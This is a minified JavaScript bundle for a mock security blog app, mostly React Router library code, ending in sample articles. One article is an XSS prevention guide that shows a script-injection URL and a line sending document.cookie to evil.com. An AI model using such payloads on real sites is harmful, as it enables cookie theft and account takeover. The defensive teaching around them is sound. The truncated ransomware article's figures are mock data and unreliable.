j.useMemo(()=>Fg(e,JSON.parse(a),r,t==="path"),[e,a,r,t])}function e4(e,t){return Vw(e,t)}function Vw(e,t,n,r,a){var T;Wt(Fl(),"useRoutes() may be used only in the context of a <Router> component.");let{navigator:l}=j.useContext(Zr),{matches:u}=j.useContext(Rr),f=u[u.length-1],h=f?f.params:{},m=f?f.pathname:"/",x=f?f.pathnameBase:"/",g=f&&f.route;{let A=g&&g.path||"";Gw(m,!g||A.endsWith("*")||A.endsWith("*?"),`You rendered descendant <Routes> (or called \`useRoutes()\`) at "${m}" (under <Route path="${A}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${A}"> to <Route path="${A==="/"?"*":`${A}/*`}">.`)}let b=Or(),E;if(t){let A=typeof t=="string"?Rl(t):t;Wt(x==="/"||((T=A.pathname)==null?void 0:T.startsWith(x)),`When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${x}" but pathname "${A.pathname}" was given in the \`location\` prop.`),E=A}else E=b;let C=E.pathname||"/",P=C;if(x!=="/"){let A=x.replace(/^\//,"").split("/");P="/"+C.replace(/^\//,"").split("/").slice(A.length).join("/")}let O=Hw(e,{pathname:P});jr(g||O!=null,`No routes matched location "${E.pathname}${E.search}${E.hash}" `),jr(O==null||O[O.length-1].route.element!==void 0||O[O.length-1].route.Component!==void 0||O[O.length-1].route.lazy!==void 0,`Matched leaf route at location "${E.pathname}${E.search}${E.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);let N=a4(O&&O.map(A=>Object.assign({},A,{params:Object.assign({},h,A.params),pathname:Li([x,l.encodeLocation?l.encodeLocation(A.pathname.replace(/\?/g,"%3F").replace(/#/g,"%23")).pathname:A.pathname]),pathnameBase:A.pathnameBase==="/"?x:Li([x,l.encodeLocation?l.encodeLocation(A.pathnameBase.replace(/\?/g,"%3F").replace(/#/g,"%23")).pathname:A.pathnameBase])})),u,n,r,a);return t&&N?j.createElement(Yu.Provider,{value:{location:{pathname:"/",search:"",hash:"",state:null,key:"default",...E},navigationType:"POP"}},N):N}function t4(){let e=c4(),t=YD(e)?`${e.status} ${e.statusText}`:e instanceof Error?e.message:JSON.stringify(e),n=e instanceof Error?e.stack:null,r="rgba(200,200,200, 0.5)",a={padding:"0.5rem",backgroundColor:r},l={padding:"2px 4px",backgroundColor:r},u=null;return console.error("Error handled by React Router default ErrorBoundary:",e),u=j.createElement(j.Fragment,null,j.createElement("p",null," Hey developer "),j.createElement("p",null,"You can provide a way better UX than this when your app throws errors by providing your own ",j.createElement("code",{style:l},"ErrorBoundary")," or"," ",j.createElement("code",{style:l},"errorElement")," prop on your route.")),j.createElement(j.Fragment,null,j.createElement("h2",null,"Unexpected Application Error!"),j.createElement("h3",{style:{fontStyle:"italic"}},t),n?j.createElement("pre",{style:a},n):null,u)}var n4=j.createElement(t4,null),r4=class extends j.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,t){return t.location!==e.location||t.revalidation!=="idle"&&e.revalidation==="idle"?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:e.error!==void 0?e.error:t.error,location:t.location,revalidation:e.revalidation||t.revalidation}}componentDidCatch(e,t){this.props.unstable_onError?this.props.unstable_onError(e,t):console.error("React Router caught the following error during render",e)}render(){return this.state.error!==void 0?j.createElement(Rr.Provider,{value:this.props.routeContext},j.createElement(Mg.Provider,{value:this.state.error,children:this.props.component})):this.props.children}};function i4({routeContext:e,match:t,children:n}){let r=j.useContext(Ol);return r&&r.static&&r.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=t.route.id),j.createElement(Rr.Provider,{value:e},n)}function a4(e,t=[],n=null,r=null,a=null){if(e==null){if(!n)return null;if(n.errors)e=n.matches;else if(t.length===0&&!n.initialized&&n.matches.length>0)e=n.matches;else return null}let l=e,u=n==null?void 0:n.errors;if(u!=null){let m=l.findIndex(x=>x.route.id&&(u==null?void 0:u[x.route.id])!==void 0);Wt(m>=0,`Could not find a matching route for errors on route IDs: ${Object.keys(u).join(",")}`),l=l.slice(0,Math.min(l.length,m+1))}let f=!1,h=-1;if(n)for(let m=0;m<l.length;m++){let x=l[m];if((x.route.HydrateFallback||x.route.hydrateFallbackElement)&&(h=m),x.route.id){let{loaderData:g,errors:b}=n,E=x.route.loader&&!g.hasOwnProperty(x.route.id)&&(!b||b[x.route.id]===void 0);if(x.route.lazy||E){f=!0,h>=0?l=l.slice(0,h+1):l=[l[0]];break}}}return l.reduceRight((m,x,g)=>{let b,E=!1,C=null,P=null;n&&(b=u&&x.route.id?u[x.route.id]:void 0,C=x.route.errorElement||n4,f&&(h<0&&g===0?(Gw("route-fallback",!1,"No `HydrateFallback` element provided to render during initial hydration"),E=!0,P=null):h===g&&(E=!0,P=x.route.hydrateFallbackElement||null)));let O=t.concat(l.slice(0,g+1)),N=()=>{let T;return b?T=C:E?T=P:x.route.Component?T=j.createElement(x.route.Component,null):x.route.element?T=x.route.element:T=m,j.createElement(i4,{match:x,routeContext:{outlet:m,matches:O,isDataRoute:n!=null},children:T})};return n&&(x.route.ErrorBoundary||x.route.errorElement||g===0)?j.createElement(r4,{location:n.location,revalidation:n.revalidation,component:C,error:b,children:N(),routeContext:{outlet:null,matches:O,isDataRoute:!0},unstable_onError:r}):N()},null)}function Bg(e){return`${e} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function s4(e){let t=j.useContext(Ol);return Wt(t,Bg(e)),t}function l4(e){let t=j.useContext(Ff);return Wt(t,Bg(e)),t}function o4(e){let t=j.useContext(Rr);return Wt(t,Bg(e)),t}function Hg(e){let t=o4(e),n=t.matches[t.matches.length-1];return Wt(n.route.id,`${e} can only be used on routes that contain a unique "id"`),n.route.id}function u4(){return Hg("useRouteId")}function c4(){var r;let e=j.useContext(Mg),t=l4("useRouteError"),n=Hg("useRouteError");return e!==void 0?e:(r=t.errors)==null?void 0:r[n]}function d4(){let{router:e}=s4("useNavigate"),t=Hg("useNavigate"),n=j.useRef(!1);return Yw(()=>{n.current=!0}),j.useCallback(async(a,l={})=>{jr(n.current,$w),n.current&&(typeof a=="number"?e.navigate(a):await e.navigate(a,{fromRouteId:t,...l}))},[e,t])}var Uv={};function Gw(e,t,n){!t&&!Uv[e]&&(Uv[e]=!0,jr(!1,n))}j.memo(f4);function f4({routes:e,future:t,state:n,unstable_onError:r}){return Vw(e,void 0,n,r,t)}function h4({to:e,replace:t,state:n,relative:r}){Wt(Fl(),"<Navigate> may be used only in the context of a <Router> component.");let{static:a}=j.useContext(Zr);jr(!a,"<Navigate> must not be used on the initial render in a <StaticRouter>. This is a no-op, but you should modify your code so the <Navigate> is only ever rendered in response to some user interaction or state change.");let{matches:l}=j.useContext(Rr),{pathname:u}=Or(),f=Ln(),h=Fg(e,Og(l),u,r==="path"),m=JSON.stringify(h);return j.useEffect(()=>{f(JSON.parse(m),{replace:t,state:n,relative:r})},[f,m,r,t,n]),null}function Qw(e){return JD(e.context)}function ht(e){Wt(!1,"A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.")}function p4({basename:e="/",children:t=null,location:n,navigationType:r="POP",navigator:a,static:l=!1}){Wt(!Fl(),"You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");let u=e.replace(/^\/*/,"/"),f=j.useMemo(()=>({basename:u,navigator:a,static:l,future:{}}),[u,a,l]);typeof n=="string"&&(n=Rl(n));let{pathname:h="/",search:m="",hash:x="",state:g=null,key:b="default"}=n,E=j.useMemo(()=>{let C=Ri(h,u);return C==null?null:{location:{pathname:C,search:m,hash:x,state:g,key:b},navigationType:r}},[u,h,m,x,g,b,r]);return jr(E!=null,`<Router basename="${u}"> is not able to match the URL "${h}${m}${x}" because it does not start with the basename, so the <Router> won't render anything.`),E==null?null:j.createElement(Zr.Provider,{value:f},j.createElement(Yu.Provider,{children:t,value:E}))}function m4({children:e,location:t}){return e4(p0(e),t)}function p0(e,t=[]){let n=[];return j.Children.forEach(e,(r,a)=>{if(!j.isValidElement(r))return;let l=[...t,a];if(r.type===j.Fragment){n.push.apply(n,p0(r.props.children,l));return}Wt(r.type===ht,`[${typeof r.type=="string"?r.type:r.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),Wt(!r.props.index||!r.props.children,"An index route cannot have child routes.");let u={id:r.props.id||l.join("-"),caseSensitive:r.props.caseSensitive,element:r.props.element,Component:r.props.Component,index:r.props.index,path:r.props.path,middleware:r.props.middleware,loader:r.props.loader,action:r.props.action,hydrateFallbackElement:r.props.hydrateFallbackElement,HydrateFallback:r.props.HydrateFallback,errorElement:r.props.errorElement,ErrorBoundary:r.props.ErrorBoundary,hasErrorBoundary:r.props.hasErrorBoundary===!0||r.props.ErrorBoundary!=null||r.props.errorElement!=null,shouldRevalidate:r.props.shouldRevalidate,handle:r.props.handle,lazy:r.props.lazy};r.props.children&&(u.children=p0(r.props.children,l)),n.push(u)}),n}var Nd="get",Ad="application/x-www-form-urlencoded";function Mf(e){return e!=null&&typeof e.tagName=="string"}function g4(e){return Mf(e)&&e.tagName.toLowerCase()==="button"}function x4(e){return Mf(e)&&e.tagName.toLowerCase()==="form"}function y4(e){return Mf(e)&&e.tagName.toLowerCase()==="input"}function v4(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function b4(e,t){return e.button===0&&(!t||t==="_self")&&!v4(e)}function m0(e=""){return new URLSearchParams(typeof e=="string"||Array.isArray(e)||e instanceof URLSearchParams?e:Object.keys(e).reduce((t,n)=>{let r=e[n];return t.concat(Array.isArray(r)?r.map(a=>[n,a]):[[n,r]])},[]))}function E4(e,t){let n=m0(e);return t&&t.forEach((r,a)=>{n.has(a)||t.getAll(a).forEach(l=>{n.append(a,l)})}),n}var ad=null;function w4(){if(ad===null)try{new FormData(document.createElement("form"),0),ad=!1}catch{ad=!0}return ad}var k4=new Set(["application/x-www-form-urlencoded","multipart/form-data","text/plain"]);function Xp(e){return e!=null&&!k4.has(e)?(jr(!1,`"${e}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${Ad}"`),null):e}function T4(e,t){let n,r,a,l,u;if(x4(e)){let f=e.getAttribute("action");r=f?Ri(f,t):null,n=e.getAttribute("method")||Nd,a=Xp(e.getAttribute("enctype"))||Ad,l=new FormData(e)}else if(g4(e)||y4(e)&&(e.type==="submit"||e.type==="image")){let f=e.form;if(f==null)throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');let h=e.getAttribute("formaction")||f.getAttribute("action");if(r=h?Ri(h,t):null,n=e.getAttribute("formmethod")||f.getAttribute("method")||Nd,a=Xp(e.getAttribute("formenctype"))||Xp(f.getAttribute("enctype"))||Ad,l=new FormData(f,e),!w4()){let{name:m,type:x,value:g}=e;if(x==="image"){let b=m?`${m}.`:"";l.append(`${b}x`,"0"),l.append(`${b}y`,"0")}else m&&l.append(m,g)}}else{if(Mf(e))throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');n=Nd,r=null,a=Ad,u=e}return l&&a==="text/plain"&&(u=l,l=void 0),{action:r,method:n.toLowerCase(),encType:a,formData:l,body:u}}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");function Ug(e,t){if(e===!1||e===null||typeof e>"u")throw new Error(t)}function C4(e,t,n){let r=typeof e=="string"?new URL(e,typeof window>"u"?"server://singlefetch/":window.location.origin):e;return r.pathname==="/"?r.pathname=`_root.${n}`:t&&Ri(r.pathname,t)==="/"?r.pathname=`${t.replace(/\/$/,"")}/_root.${n}`:r.pathname=`${r.pathname.replace(/\/$/,"")}.${n}`,r}async function S4(e,t){if(e.id in t)return t[e.id];try{let n=await import(e.module);return t[e.id]=n,n}catch(n){return console.error(`Error loading route module \`${e.module}\`, reloading page...`),console.error(n),window.__reactRouterContext&&window.__reactRouterContext.isSpaMode,window.location.reload(),new Promise(()=>{})}}function N4(e){return e==null?!1:e.href==null?e.rel==="preload"&&typeof e.imageSrcSet=="string"&&typeof e.imageSizes=="string":typeof e.rel=="string"&&typeof e.href=="string"}async function A4(e,t,n){let r=await Promise.all(e.map(async a=>{let l=t.routes[a.route.id];if(l){let u=await S4(l,n);return u.links?u.links():[]}return[]}));return I4(r.flat(1).filter(N4).filter(a=>a.rel==="stylesheet"||a.rel==="preload").map(a=>a.rel==="stylesheet"?{...a,rel:"prefetch",as:"style"}:{...a,rel:"prefetch"}))}function zv(e,t,n,r,a,l){let u=(h,m)=>n[m]?h.route.id!==n[m].route.id:!0,f=(h,m)=>{var x;return n[m].pathname!==h.pathname||((x=n[m].route.path)==null?void 0:x.endsWith("*"))&&n[m].params["*"]!==h.params["*"]};return l==="assets"?t.filter((h,m)=>u(h,m)||f(h,m)):l==="data"?t.filter((h,m)=>{var g;let x=r.routes[h.route.id];if(!x||!x.hasLoader)return!1;if(u(h,m)||f(h,m))return!0;if(h.route.shouldRevalidate){let b=h.route.shouldRevalidate({currentUrl:new URL(a.pathname+a.search+a.hash,window.origin),currentParams:((g=n[0])==null?void 0:g.params)||{},nextUrl:new URL(e,window.origin),nextParams:h.params,defaultShouldRevalidate:!0});if(typeof b=="boolean")return b}return!0}):[]}function D4(e,t,{includeHydrateFallback:n}={}){return L4(e.map(r=>{let a=t.routes[r.route.id];if(!a)return[];let l=[a.module];return a.clientActionModule&&(l=l.concat(a.clientActionModule)),a.clientLoaderModule&&(l=l.concat(a.clientLoaderModule)),n&&a.hydrateFallbackModule&&(l=l.concat(a.hydrateFallbackModule)),a.imports&&(l=l.concat(a.imports)),l}).flat(1))}function L4(e){return[...new Set(e)]}function _4(e){let t={},n=Object.keys(e).sort();for(let r of n)t[r]=e[r];return t}function I4(e,t){let n=new Set;return new Set(t),e.reduce((r,a)=>{let l=JSON.stringify(_4(a));return n.has(l)||(n.add(l),r.push({key:l,link:a})),r},[])}function Kw(){let e=j.useContext(Ol);return Ug(e,"You must render this element inside a <DataRouterContext.Provider> element"),e}function P4(){let e=j.useContext(Ff);return Ug(e,"You must render this element inside a <DataRouterStateContext.Provider> element"),e}var zg=j.createContext(void 0);zg.displayName="FrameworkContext";function Xw(){let e=j.useContext(zg);return Ug(e,"You must render this element inside a <HydratedRouter> element"),e}function j4(e,t){let n=j.useContext(zg),[r,a]=j.useState(!1),[l,u]=j.useState(!1),{onFocus:f,onBlur:h,onMouseEnter:m,onMouseLeave:x,onTouchStart:g}=t,b=j.useRef(null);j.useEffect(()=>{if(e==="render"&&u(!0),e==="viewport"){let P=N=>{N.forEach(T=>{u(T.isIntersecting)})},O=new IntersectionObserver(P,{threshold:.5});return b.current&&O.observe(b.current),()=>{O.disconnect()}}},[e]),j.useEffect(()=>{if(r){let P=setTimeout(()=>{u(!0)},100);return()=>{clearTimeout(P)}}},[r]);let E=()=>{a(!0)},C=()=>{a(!1),u(!1)};return n?e!=="intent"?[l,b,{}]:[l,b,{onFocus:Io(f,E),onBlur:Io(h,C),onMouseEnter:Io(m,E),onMouseLeave:Io(x,C),onTouchStart:Io(g,E)}]:[!1,b,{}]}function Io(e,t){return n=>{e&&e(n),n.defaultPrevented||t(n)}}function R4({page:e,...t}){let{router:n}=Kw(),r=j.useMemo(()=>Hw(n.routes,e,n.basename),[n.routes,e,n.basename]);return r?j.createElement(F4,{page:e,matches:r,...t}):null}function O4(e){let{manifest:t,routeModules:n}=Xw(),[r,a]=j.useState([]);return j.useEffect(()=>{let l=!1;return A4(e,t,n).then(u=>{l||a(u)}),()=>{l=!0}},[e,t,n]),r}function F4({page:e,matches:t,...n}){let r=Or(),{manifest:a,routeModules:l}=Xw(),{basename:u}=Kw(),{loaderData:f,matches:h}=P4(),m=j.useMemo(()=>zv(e,t,h,a,r,"data"),[e,t,h,a,r]),x=j.useMemo(()=>zv(e,t,h,a,r,"assets"),[e,t,h,a,r]),g=j.useMemo(()=>{if(e===r.pathname+r.search+r.hash)return[];let C=new Set,P=!1;if(t.forEach(N=>{var A;let T=a.routes[N.route.id];!T||!T.hasLoader||(!m.some(_=>_.route.id===N.route.id)&&N.route.id in f&&((A=l[N.route.id])!=null&&A.shouldRevalidate)||T.hasClientLoader?P=!0:C.add(N.route.id))}),C.size===0)return[];let O=C4(e,u,"data");return P&&C.size>0&&O.searchParams.set("_routes",t.filter(N=>C.has(N.route.id)).map(N=>N.route.id).join(",")),[O.pathname+O.search]},[u,f,r,a,m,t,e,l]),b=j.useMemo(()=>D4(x,a),[x,a]),E=O4(x);return j.createElement(j.Fragment,null,g.map(C=>j.createElement("link",{key:C,rel:"prefetch",as:"fetch",href:C,...n})),b.map(C=>j.createElement("link",{key:C,rel:"modulepreload",href:C,...n})),E.map(({key:C,link:P})=>j.createElement("link",{key:C,nonce:n.nonce,...P})))}function M4(...e){return t=>{e.forEach(n=>{typeof n=="function"?n(t):n!=null&&(n.current=t)})}}var Zw=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";try{Zw&&(window.__reactRouterVersion="7.9.5")}catch{}function B4({basename:e,children:t,window:n}){let r=j.useRef();r.current==null&&(r.current=kD({window:n,v5Compat:!0}));let a=r.current,[l,u]=j.useState({action:a.action,location:a.location}),f=j.useCallback(h=>{j.startTransition(()=>u(h))},[u]);return j.useLayoutEffect(()=>a.listen(f),[a,f]),j.createElement(p4,{basename:e,children:t,location:l.location,navigationType:l.action,navigator:a})}var Jw=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,we=j.forwardRef(function({onClick:t,discover:n="render",prefetch:r="none",relative:a,reloadDocument:l,replace:u,state:f,target:h,to:m,preventScrollReset:x,viewTransition:g,...b},E){let{basename:C}=j.useContext(Zr),P=typeof m=="string"&&Jw.test(m),O,N=!1;if(typeof m=="string"&&P&&(O=m,Zw))try{let $=new URL(window.location.href),Y=m.startsWith("//")?new URL($.protocol+m):new URL(m),ne=Ri(Y.pathname,C);Y.origin===$.origin&&ne!=null?m=ne+Y.search+Y.hash:N=!0}catch{jr(!1,`<Link to="${m}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)}let T=KD(m,{relative:a}),[A,_,M]=j4(r,b),R=W4(m,{replace:u,state:f,target:h,preventScrollReset:x,relative:a,viewTransition:g});function B($){t&&t($),$.defaultPrevented||R($)}let U=j.createElement("a",{...b,...M,href:O||T,onClick:N||l?t:B,ref:M4(E,_),target:h,"data-discover":!P&&n==="render"?"true":void 0});return A&&!P?j.createElement(j.Fragment,null,U,j.createElement(R4,{page:T})):U});we.displayName="Link";var H4=j.forwardRef(function({"aria-current":t="page",caseSensitive:n=!1,className:r="",end:a=!1,style:l,to:u,viewTransition:f,children:h,...m},x){let g=Gu(u,{relative:m.relative}),b=Or(),E=j.useContext(Ff),{navigator:C,basename:P}=j.useContext(Zr),O=E!=null&&G4(g)&&f===!0,N=C.encodeLocation?C.encodeLocation(g).pathname:g.pathname,T=b.pathname,A=E&&E.navigation&&E.navigation.location?E.navigation.location.pathname:null;n||(T=T.toLowerCase(),A=A?A.toLowerCase():null,N=N.toLowerCase()),A&&P&&(A=Ri(A,P)||A);const _=N!=="/"&&N.endsWith("/")?N.length-1:N.length;let M=T===N||!a&&T.startsWith(N)&&T.charAt(_)==="/",R=A!=null&&(A===N||!a&&A.startsWith(N)&&A.charAt(N.length)==="/"),B={isActive:M,isPending:R,isTransitioning:O},U=M?t:void 0,$;typeof r=="function"?$=r(B):$=[r,M?"active":null,R?"pending":null,O?"transitioning":null].filter(Boolean).join(" ");let Y=typeof l=="function"?l(B):l;return j.createElement(we,{...m,"aria-current":U,className:$,ref:x,style:Y,to:u,viewTransition:f},typeof h=="function"?h(B):h)});H4.displayName="NavLink";var U4=j.forwardRef(({discover:e="render",fetcherKey:t,navigate:n,reloadDocument:r,replace:a,state:l,method:u=Nd,action:f,onSubmit:h,relative:m,preventScrollReset:x,viewTransition:g,...b},E)=>{let C=Y4(),P=V4(f,{relative:m}),O=u.toLowerCase()==="get"?"get":"post",N=typeof f=="string"&&Jw.test(f),T=A=>{if(h&&h(A),A.defaultPrevented)return;A.preventDefault();let _=A.nativeEvent.submitter,M=(_==null?void 0:_.getAttribute("formmethod"))||u;C(_||A.currentTarget,{fetcherKey:t,method:M,navigate:n,replace:a,state:l,relative:m,preventScrollReset:x,viewTransition:g})};return j.createElement("form",{ref:E,method:O,action:P,onSubmit:r?h:T,...b,"data-discover":!N&&e==="render"?"true":void 0})});U4.displayName="Form";function z4(e){return`${e} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function ek(e){let t=j.useContext(Ol);return Wt(t,z4(e)),t}function W4(e,{target:t,replace:n,state:r,preventScrollReset:a,relative:l,viewTransition:u}={}){let f=Ln(),h=Or(),m=Gu(e,{relative:l});return j.useCallback(x=>{if(b4(x,t)){x.preventDefault();let g=n!==void 0?n:Du(h)===Du(m);f(e,{replace:g,state:r,preventScrollReset:a,relative:l,viewTransition:u})}},[h,f,m,n,r,t,e,a,l,u])}function Qu(e){jr(typeof URLSearchParams<"u","You cannot use the `useSearchParams` hook in a browser that does not support the URLSearchParams API. If you need to support Internet Explorer 11, we recommend you load a polyfill such as https://github.com/ungap/url-search-params.");let t=j.useRef(m0(e)),n=j.useRef(!1),r=Or(),a=j.useMemo(()=>E4(r.search,n.current?null:t.current),[r.search]),l=Ln(),u=j.useCallback((f,h)=>{const m=m0(typeof f=="function"?f(new URLSearchParams(a)):f);n.current=!0,l("?"+m,h)},[l,a]);return[a,u]}var q4=0,$4=()=>`__${String(++q4)}__`;function Y4(){let{router:e}=ek("useSubmit"),{basename:t}=j.useContext(Zr),n=u4();return j.useCallback(async(r,a={})=>{let{action:l,method:u,encType:f,formData:h,body:m}=T4(r,t);if(a.navigate===!1){let x=a.fetcherKey||$4();await e.fetch(x,n,a.action||l,{preventScrollReset:a.preventScrollReset,formData:h,body:m,formMethod:a.method||u,formEncType:a.encType||f,flushSync:a.flushSync})}else await e.navigate(a.action||l,{preventScrollReset:a.preventScrollReset,formData:h,body:m,formMethod:a.method||u,formEncType:a.encType||f,replace:a.replace,state:a.state,fromRouteId:n,flushSync:a.flushSync,viewTransition:a.viewTransition})},[e,t,n])}function V4(e,{relative:t}={}){let{basename:n}=j.useContext(Zr),r=j.useContext(Rr);Wt(r,"useFormAction must be used inside a RouteContext");let[a]=r.matches.slice(-1),l={...Gu(e||".",{relative:t})},u=Or();if(e==null){l.search=u.search;let f=new URLSearchParams(l.search),h=f.getAll("index");if(h.some(x=>x==="")){f.delete("index"),h.filter(g=>g).forEach(g=>f.append("index",g));let x=f.toString();l.search=x?`?${x}`:""}}return(!e||e===".")&&a.route.index&&(l.search=l.search?l.search.replace(/^\?/,"?index&"):"?index"),n!=="/"&&(l.pathname=l.pathname==="/"?n:Li([n,l.pathname])),Du(l)}function G4(e,{relative:t}={}){let n=j.useContext(qw);Wt(n!=null,"`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");let{basename:r}=ek("useViewTransitionState"),a=Gu(e,{relative:t});if(!n.isTransitioning)return!1;let l=Ri(n.currentLocation.pathname,r)||n.currentLocation.pathname,u=Ri(n.nextLocation.pathname,r)||n.nextLocation.pathname;return sf(a.pathname,u)!=null||sf(a.pathname,l)!=null}const et=[{id:1,username:"admin",email:"admin@cybershare.com",fullName:"Admin User",displayName:"Admin User",avatar:"https://api.dicebear.com/7.x/avataaars/svg?seed=admin",avatarUrl:"https://api.dicebear.com/7.x/avataaars/svg?seed=admin",bio:"Administrator of CyberShare. Sharing the latest in InfoSec.",about:"Administrator of CyberShare. Sharing the latest in InfoSec.",role:"ADMIN",followersCount:120,followingCount:15,createdAt:"2023-01-01T00:00:00Z"},{id:2,username:"hacker_one",email:"hacker@cybershare.com",fullName:"Alice White",displayName:"Alice White",avatar:"https://api.dicebear.com/7.x/avataaars/svg?seed=Alice",avatarUrl:"https://api.dicebear.com/7.x/avataaars/svg?seed=Alice",bio:"Ethical Hacker | Bug Bounty Hunter",about:"Ethical Hacker | Bug Bounty Hunter",role:"USER",followersCount:85,followingCount:40,createdAt:"2023-02-15T00:00:00Z"},{id:3,username:"sec_guru",email:"guru@cybershare.com",fullName:"Bob Security",displayName:"Bob Security",avatar:"https://api.dicebear.com/7.x/avataaars/svg?seed=Bob",avatarUrl:"https://api.dicebear.com/7.x/avataaars/svg?seed=Bob",bio:"Security Consultant & Pentester",about:"Security Consultant & Pentester",role:"USER",followersCount:230,followingCount:10,createdAt:"2023-03-10T00:00:00Z"},{id:4,username:"cloud_defender",email:"cloud@cybershare.com",fullName:"Carol Chen",displayName:"Carol Chen",avatar:"https://api.dicebear.com/7.x/avataaars/svg?seed=Carol",avatarUrl:"https://api.dicebear.com/7.x/avataaars/svg?seed=Carol",bio:"Cloud Security Specialist | AWS Solutions Architect",about:"Cloud Security Specialist | AWS Solutions Architect | 10+ years in cybersecurity",role:"USER",followersCount:156,followingCount:28,createdAt:"2023-04-05T00:00:00Z"},{id:5,username:"malware_hunter",email:"malware@cybershare.com",fullName:"David Threat",displayName:"David Threat",avatar:"https://api.dicebear.com/7.x/avataaars/svg?seed=David",avatarUrl:"https://api.dicebear.com/7.x/avataaars/svg?seed=David",bio:"Malware Analyst | Reverse Engineer | OSINT Enthusiast",about:"Malware Analyst | Reverse Engineer | OSINT Enthusiast | Passionate about threat intelligence",role:"USER",followersCount:198,followingCount:52,createdAt:"2023-05-20T00:00:00Z"}],pt=[{id:1,name:"Network Security",slug:"network-security",description:"Protecting network infrastructure."},{id:2,name:"Web Security",slug:"web-security",description:"Securing web applications."},{id:3,name:"Cryptography",slug:"cryptography",description:"Encryption and secure communication."},{id:4,name:"Malware Analysis",slug:"malware-analysis",description:"Dissecting malicious software."},{id:5,name:"Cloud Security",slug:"cloud-security",description:"Securing cloud environments."}],yn=[{id:1,name:"XSS",slug:"xss"},{id:2,name:"SQL Injection",slug:"sql-injection"},{id:3,name:"Ransomware",slug:"ransomware"},{id:4,name:"Zero-Day",slug:"zero-day"},{id:5,name:"Phishing",slug:"phishing"},{id:6,name:"Firewall",slug:"firewall"},{id:7,name:"Kali Linux",slug:"kali-linux"}],$s=[{id:1,title:"Understanding Cross-Site Scripting (XSS)",slug:"understanding-xss",excerpt:"A comprehensive guide to detecting and preventing XSS attacks in modern web applications.",summary:"A comprehensive guide to detecting and preventing XSS attacks in modern web applications.",content:`
## Introduction

Cross-Site Scripting (XSS) remains one of the most prevalent web security vulnerabilities. According to OWASP, XSS consistently ranks in the top 10 web application security risks. In this article, we'll explore what XSS is, how it works, and most importantly, how to protect your applications.

## What is XSS?

XSS is a type of injection attack where malicious scripts are inserted into trusted websites. When a user visits the compromised page, the malicious script executes in their browser, potentially stealing sensitive information or performing actions on their behalf.

## Types of XSS Attacks

### 1. Stored XSS (Persistent)

The most dangerous type. The malicious script is permanently stored on the target server (e.g., in a database). Every user who views the affected page will execute the script.

\`\`\`javascript
// Example of vulnerable code
document.getElementById('comment').innerHTML = userInput;
\`\`\`

### 2. Reflected XSS (Non-Persistent)

The malicious script is reflected off the web server, typically via a URL parameter. The attacker tricks the victim into clicking a crafted link.

\`\`\`
https://example.com/search?q=<script>alert('XSS')<\/script>
\`\`\`

### 3. DOM-based XSS

The vulnerability exists entirely in client-side code. The malicious payload is executed as a result of modifying the DOM.

\`\`\`javascript
// Vulnerable DOM manipulation
document.location = 'http://evil.com?cookie=' + document.cookie;
\`\`\`

## Prevention Techniques

### Input Validation
Always validate and sanitize user input on both client and server sides.

### Output Encoding
Encode data before rendering it in the browser:

\`\`\`javascript
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}
\`\`\`

### Content Security Policy (CSP)
Implement CSP headers to restrict script execution:

\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'
\`\`\`

### Use Modern Frameworks
React, Vue, and Angular automatically escape content by default, significantly reducing XSS risks.

## Conclusion

XSS attacks can have devastating consequences, from session hijacking to complete account takeover. By understanding the different types of XSS and implementing proper security measures, you can protect your applications and users from these threats.

> **Remember:** Security is not a one-time task but an ongoing process. Stay updated with the latest security practices and regularly audit your code.
    `,thumbnail:"https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=1000",coverImageUrl:"https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=1000",author:et[1],authorUsername:et[1].username,authorDisplayName:et[1].displayName,authorAvatarUrl:et[1].avatarUrl,category:pt[1],categoryName:pt[1].name,categorySlug:pt[1].slug,tags:[yn[0],yn[1]],createdAt:"2023-10-15T08:00:00Z",publishedAt:"2023-10-15T08:00:00Z",updatedAt:"2023-10-15T08:00:00Z",viewCount:1542,views:1542,likesCount:45,commentCount:12,commentsCount:12,isPublished:!0},{id:2,title:"The Rise of Ransomware in 2024",slug:"ransomware-2024",excerpt:"Analyzing the latest ransomware trends and how organizations can protect themselves.",summary:"Analyzing the latest ransomware trends and how organizations can protect themselves.",content:`
## The Current Ransomware Landscape

Ransomware attacks have evolved dramatically over the past few years. In 2024, we're seeing more sophisticated attacks targeting critical infrastructure, healthcare, and education sectors. This article explores the current trends and provides actionable defense strategies.

## Key Statistics

| Year | Reported Attacks | Average Ransom |
|------|------------------|----------------|
| 2022 | 623 million | $812,000 |
| 2023 | 750 million | $1.2 million |
| 2024 | 890 million* | $1.8 million |

*Projected based on H1 data

## Notable Attack Vectors

### 1. Phishing Emails
